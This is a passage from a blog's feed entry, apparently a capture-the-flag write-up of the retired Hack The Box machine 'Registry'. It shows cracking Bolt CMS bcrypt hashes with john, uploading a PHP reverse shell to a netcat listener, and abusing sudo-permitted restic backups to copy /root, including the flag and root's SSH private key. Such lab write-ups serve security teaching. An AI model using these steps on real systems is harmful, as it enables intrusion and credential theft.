+&lt;span class="code-line"&gt;bolt_entries      bolt_log_system   bolt_taxonomy&lt;/span&gt;
+&lt;span class="code-line"&gt;sqlite&amp;gt; select * from bolt_users;&lt;/span&gt;
+&lt;span class="code-line"&gt;1|admi|$2y$10$hcuhBWxp7Ypk8Wx.LUpEguihXr60tiDeh46v3cSy7wvKnQSq/Kre2|thek27@gmail.com|2019-05-29 11:02:18|192.168.50.1|Admin|[]|1||||0||[&amp;quot;root&amp;quot;,&amp;quot;everyone&amp;quot;]&lt;/span&gt;
+&lt;span class="code-line"&gt;sqlite&amp;gt; select * from bolt_authtoken;&lt;/span&gt;
+&lt;span class="code-line"&gt;1|1||5ce26d1b34ecf3405469c50ef01e044793c71db8da07e4705fc995a0bd964505|05fde348656e16b2589424fb7d175372|2019-05-29 11:02:18|192.168.50.1|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36|2019-06-12 11:02:18&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can use &lt;code&gt;sqlite&amp;gt; .schema bolt_users&lt;/code&gt; to show the columns name (for the
+bolt_users table).&lt;/p&gt;
+&lt;p&gt;We try to brute force the password has using john. The hash algorithm is bcrypt and
+the password doesn't seems to be on the rockyou top 10 000 (+ the three passwords found
+earlier).&lt;/p&gt;
+&lt;h3 id="production-db"&gt;Production DB&lt;/h3&gt;
+&lt;p&gt;We are working on the backup database. Let us just get the "production" one.
+And dump the same table. The hash is different.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;scp bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db ./&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;/root/.ssh/id_rsa&amp;#39;:&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt.db    100%  296KB  65.2KB/s   00:04&lt;/span&gt;
+&lt;span class="code-line"&gt;sqlite3 bolt.db&lt;/span&gt;
+&lt;span class="code-line"&gt;SQLite version 3.30.1 2019-10-10 20:19:45&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
+&lt;span class="code-line"&gt;sqlite&amp;gt; select * from bolt_users;&lt;/span&gt;
+&lt;span class="code-line"&gt;1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-12-04 12:58:05|10.10.16.58|Admin|[&amp;quot;files://ls.php.png&amp;quot;]|1||||0||[&amp;quot;root&amp;quot;,&amp;quot;everyone&amp;quot;]&lt;/span&gt;
+&lt;span class="code-line"&gt;2|test|$2y$10$8GeiNSHiL3pAlMyRvjY2seroSOYQnvRKmZxk/iadII3lKPYhsvh1S|a@a.a|2019-12-04 09:09:13|10.10.14.218|testingtege|[&amp;quot;files://166912.jpg&amp;quot;]|1||||0||[&amp;quot;editor&amp;quot;,&amp;quot;chief-editor&amp;quot;,&amp;quot;admin&amp;quot;,&amp;quot;developer&amp;quot;,&amp;quot;guest&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;everyone&amp;quot;]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This time john is more efficient and we found the password almost immediately.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john  hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;bcrypt&amp;quot;, but the string is also recognized as &amp;quot;bcrypt-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=bcrypt-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 1 (iteration count) is 1024 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;strawberry       (?)&lt;/span&gt;
+&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2019-12-04 16:38) 0.2439g/s 87.80p/s 87.80c/s 87.80C/s strawberry..brianna&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
+&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="bolt-cms"&gt;Bolt CMS&lt;/h2&gt;
+&lt;p&gt;We go to the &lt;a href="https://bolt.cm/"&gt;bolt&lt;/a&gt; login interface.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Bolt login interface" src="/media/2020.04/registry_3.png"&gt;&lt;/p&gt;
+&lt;p&gt;We connect as admin using the cracked password (&lt;code&gt;strawberry&lt;/code&gt;).
+There is a menu to upload some files. But the PHP files are not authorized.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Bolt dashboard" src="/media/2020.04/registry_4.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Upload files interface" src="/media/2020.04/registry_8.png"&gt;&lt;/p&gt;
+&lt;p&gt;As we are admin we can change this configuration in the "configuration/main
+configuration" menu.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Configuration menu" src="/media/2020.04/registry_5.png"&gt;&lt;/p&gt;
+&lt;p&gt;We just add the PHP files in the authorized extension and save the
+configuration.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Configuration menu, adding PHP" src="/media/2020.04/registry_7.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can then upload our PHP reverse shell (from
+&lt;code&gt;/usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt;). Pointing to our local
+&lt;code&gt;netcat&lt;/code&gt; running as bolt.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;set_time_limit&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;// CHANGE THIS&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4343&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;       &lt;span class="c1"&gt;// CHANGE THIS&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$chunk_size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1400&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Reverse shell uploaded" src="/media/2020.04/registry_9.png"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:~$ nc -l -p 4343&lt;/span&gt;
+&lt;span class="code-line"&gt;Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+&lt;span class="code-line"&gt;14:06:37 up  2:50,  2 users,  load average: 0.14, 0.08, 0.02&lt;/span&gt;
+&lt;span class="code-line"&gt;USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt     pts/2    10.10.15.63      11:35    2:21   0.01s  0.00s nc -l -p 4343&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt     pts/3    10.10.15.1       13:31   53.00s  0.03s  0.03s -bash&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
+&lt;span class="code-line"&gt;/bin/sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
+&lt;span class="code-line"&gt;$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;Note: all the above operation must be done "quickly" as the bolt's
+configuration and the uploaded files are reset every few minutes.&lt;/strong&gt; Once you get
+the reverse shell the reset won't impact you anymore.&lt;/p&gt;
+&lt;h2 id="www-data"&gt;www-data&lt;/h2&gt;
+&lt;p&gt;Now that we are &lt;code&gt;www-data&lt;/code&gt; we can check our previous assumptions regarding its
+&lt;code&gt;sudo&lt;/code&gt; rights.&lt;/p&gt;
+&lt;p&gt;:::text
+  $ sudo -l
+  Matching Defaults entries for www-data on bolt:
+      env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/p&gt;
+&lt;p&gt;User www-data may run the following commands on bolt:
+      (root) NOPASSWD: /usr/bin/restic backup -r rest*&lt;/p&gt;
+&lt;p&gt;We read carefully the &lt;code&gt;restic&lt;/code&gt; &lt;a href="https://restic.readthedocs.io"&gt;documentation&lt;/a&gt;.
+The most interesting pages are:
+* &lt;a href="https://restic.readthedocs.io/en/stable/040_backup.html"&gt;How to backup data&lt;/a&gt;
+* &lt;a href="https://restic.readthedocs.io/en/stable/030_preparing_a_new_repo.html"&gt;How to create a new repository&lt;/a&gt;
+* &lt;a href="https://restic.readthedocs.io/en/stable/030_preparing_a_new_repo.html#rest-server"&gt;And more specificaly how to run a REST repository&lt;/a&gt;
+* &lt;a href="https://github.com/restic/rest-server"&gt;The github repository of the REST server&lt;/a&gt;
+* &lt;a href="https://restic.readthedocs.io/en/stable/050_restore.html"&gt;How to restore a backup&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;From there we upload a complied GO binary of rest-server from the
+&lt;a href="https://github.com/restic/rest-server/releases"&gt;github project&lt;/a&gt;
+to the box using the bolt SSH account.&lt;/p&gt;
+&lt;p&gt;We create a directory in &lt;code&gt;/tmp/&lt;/code&gt;, upload our binary and create another
+directory for our backups.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp$ mkdir ioio2&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp$ cd ioio2&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls&lt;/span&gt;
+&lt;span class="code-line"&gt;rest-server-0.9.7-linux-amd64&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ chmod +x rest-server-0.9.7-linux-amd64&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ mkdir srv&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We imitate the &lt;code&gt;restic&lt;/code&gt; repository in our folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ restic init --repo ./srv/&lt;/span&gt;
+&lt;span class="code-line"&gt;enter password for new repository:&lt;/span&gt;
+&lt;span class="code-line"&gt;enter password again:&lt;/span&gt;
+&lt;span class="code-line"&gt;created restic repository b421a8c9a1 at ./srv/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Please note that knowledge of your password is required to access&lt;/span&gt;
+&lt;span class="code-line"&gt;the repository. Losing your password means that your data is&lt;/span&gt;
+&lt;span class="code-line"&gt;irrecoverably lost.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We run the server with the debug option.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ ./rest-server-0.9.7-linux-amd64 --path /tmp/ioio2/srv/  --debug&lt;/span&gt;
+&lt;span class="code-line"&gt;rest-server 0.9.7 compiled with go1.10 on linux/amd64&lt;/span&gt;
+&lt;span class="code-line"&gt;Data directory: /tmp/ioio2/srv/&lt;/span&gt;
+&lt;span class="code-line"&gt;Authentication disabled&lt;/span&gt;
+&lt;span class="code-line"&gt;Private repositories disabled&lt;/span&gt;
+&lt;span class="code-line"&gt;Starting server on :8000&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With our &lt;code&gt;www-data&lt;/code&gt; webshell we put the repository password in a file and
+backup the whole &lt;code&gt;/root/&lt;/code&gt; directory.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ echo lol &amp;gt; /tmp/l&lt;/span&gt;
+&lt;span class="code-line"&gt;$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ -p /tmp/l /root/&lt;/span&gt;
+&lt;span class="code-line"&gt;scan [/root]&lt;/span&gt;
+&lt;span class="code-line"&gt;[0:00] 10 directories, 14 files, 28.066 KiB&lt;/span&gt;
+&lt;span class="code-line"&gt;scanned 10 directories, 14 files in 0:00&lt;/span&gt;
+&lt;span class="code-line"&gt;[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;duration: 0:00&lt;/span&gt;
+&lt;span class="code-line"&gt;snapshot 485d9809 saved&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Back to our bolt SSH shell we can check the snapshots in our
+repository (yes I did some test with the bolt user. That's how I discover that I
+was prompted for password).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ restic -r ./srv/ snapshots&lt;/span&gt;
+&lt;span class="code-line"&gt;enter password for repository:&lt;/span&gt;
+&lt;span class="code-line"&gt;password is correct&lt;/span&gt;
+&lt;span class="code-line"&gt;ID        Date                 Host        Tags        Directory&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;91587cbd  2019-12-05 15:20:31  bolt                    /home/bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;bf190199  2019-12-05 15:21:59  bolt                    /home/bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;c7702698  2019-12-05 15:23:55  bolt                    /home/bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;485d9809  2019-12-05 15:25:06  bolt                    /root&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;4 snapshots&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We restore the last snapshot in a new directory. It generate some errors that we
+don't really care about.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ mkdir rest&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ restic -r ./srv/ restore 485d9809 --target  ./rest&lt;/span&gt;
+&lt;span class="code-line"&gt;enter password for repository:&lt;/span&gt;
+&lt;span class="code-line"&gt;password is correct&lt;/span&gt;
+&lt;span class="code-line"&gt;restoring &amp;lt;Snapshot 485d9809 of [/root] at 2019-12-05 15:25:06.665521427 +0000 UTC by root@bolt&amp;gt; to ./rest&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.bash_history: Lchown: lchown /tmp/ioio2/rest/root/.bash_history: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.bashrc: Lchown: lchown /tmp/ioio2/rest/root/.bashrc: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.cache/motd.legal-displayed: Lchown: lchown /tmp/ioio2/rest/root/.cache/motd.legal-displayed: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.cache: Lchown: lchown /tmp/ioio2/rest/root/.cache: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.config/composer/keys.dev.pub: Lchown: lchown /tmp/ioio2/rest/root/.config/composer/keys.dev.pub: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.config/composer/keys.tags.pub: Lchown: lchown /tmp/ioio2/rest/root/.config/composer/keys.tags.pub: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.config/composer: Lchown: lchown /tmp/ioio2/rest/root/.config/composer: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.config: Lchown: lchown /tmp/ioio2/rest/root/.config: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.gnupg/private-keys-v1.d: Lchown: lchown /tmp/ioio2/rest/root/.gnupg/private-keys-v1.d: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.gnupg: Lchown: lchown /tmp/ioio2/rest/root/.gnupg: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.local/share/nano: Lchown: lchown /tmp/ioio2/rest/root/.local/share/nano: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.local/share: Lchown: lchown /tmp/ioio2/rest/root/.local/share: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.local: Lchown: lchown /tmp/ioio2/rest/root/.local: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.profile: Lchown: lchown /tmp/ioio2/rest/root/.profile: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.selected_editor: Lchown: lchown /tmp/ioio2/rest/root/.selected_editor: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.ssh/authorized_keys: Lchown: lchown /tmp/ioio2/rest/root/.ssh/authorized_keys: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.ssh/id_rsa: Lchown: lchown /tmp/ioio2/rest/root/.ssh/id_rsa: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.ssh/id_rsa.pub: Lchown: lchown /tmp/ioio2/rest/root/.ssh/id_rsa.pub: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.ssh: Lchown: lchown /tmp/ioio2/rest/root/.ssh: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/.wget-hsts: Lchown: lchown /tmp/ioio2/rest/root/.wget-hsts: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/config.yml: Lchown: lchown /tmp/ioio2/rest/root/config.yml: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/cron.sh: Lchown: lchown /tmp/ioio2/rest/root/cron.sh: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root/root.txt: Lchown: lchown /tmp/ioio2/rest/root/root.txt: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring error for /root: Lchown: lchown /tmp/ioio2/rest/root: operation not permitted&lt;/span&gt;
+&lt;span class="code-line"&gt;There were 24 errors&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the root directory backup we found the flag as planned.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ ls rest&lt;/span&gt;
+&lt;span class="code-line"&gt;root&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;rest/root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ cat rest/root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;ntrkzgnkotaxyju0ntrinda4yzbkztgw&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;But we also found a SSH private key without password that allow us to connect as
+root on the box!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/.&lt;/span&gt;
+&lt;span class="code-line"&gt;./                ../               .bash_history     .bashrc           .cache/           .config/          .gnupg/           .local/           .profile          .selected_editor  .ssh/             .wget-hsts&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/.ssh/&lt;/span&gt;
+&lt;span class="code-line"&gt;authorized_keys  id_rsa           id_rsa.pub&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/.ssh/&lt;/span&gt;
+&lt;span class="code-line"&gt;authorized_keys  id_rsa  id_rsa.pub&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Once copied on our local machine.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh root@10.10.10.159 -i ./id_rsa_root&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  System information as of Thu Dec  5 18:51:02 UTC 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  System load:  0.08              Users logged in:                1&lt;/span&gt;
+&lt;span class="code-line"&gt;  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159&lt;/span&gt;
+&lt;span class="code-line"&gt;  Memory usage: 42%               IP address for br-1bad9bd75d17: 172.18.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;  Swap usage:   0%                IP address for docker0:         172.17.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;  Processes:    170&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Mon Oct 21 09:53:48 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;root@bolt:~#&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;What a journey! This box was very interesting I learn a lot about Docker
+registry in the user part. The root part was quit harder but also interesting.
+The backup database was quit a rabbit hole for me. But once connected as admin
+on the bolt CMS things get chained up pretty quick.
+Many thanks to &lt;a href="https://www.hackthebox.eu/home/users/profile/4615"&gt;thek&lt;/a&gt; for
+this awesome box!&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="linux"></category><category term="HTB"></category><category term="docker"></category><category term="bolt CMS"></category><category term="restic"></category><category term="SUID"></category></entry><entry><title>HTB: Forest</title><link href="https://maggick.fr/2020/03/htb-forest.html" rel="alternate"></link><published>2020-03-21T17:10:00+01:00</published><updated>2020-03-21T17:10:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-21:/2020/03/htb-forest.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forest card" class="align-left" src="/media/2020.03/forest_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/212"&gt;Forest&lt;/a&gt; published by
 &lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
